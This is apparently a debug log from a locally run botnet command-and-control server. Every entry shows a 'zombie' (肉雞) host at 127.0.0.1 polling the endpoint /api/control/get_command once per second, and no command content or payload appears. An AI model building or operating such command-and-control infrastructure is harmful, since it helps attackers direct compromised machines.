2025-06-25 11:28:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:19 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:20 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:21 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:30 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:31 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:32 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:33 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:34 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:35 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:36 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:37 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:39 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:49 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:28:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:28:59 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:28:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:28:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:28:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:01 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:02 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:03 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:05 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:06 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:07 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:08 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:29:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:29:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:29:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:29:10 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:29:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
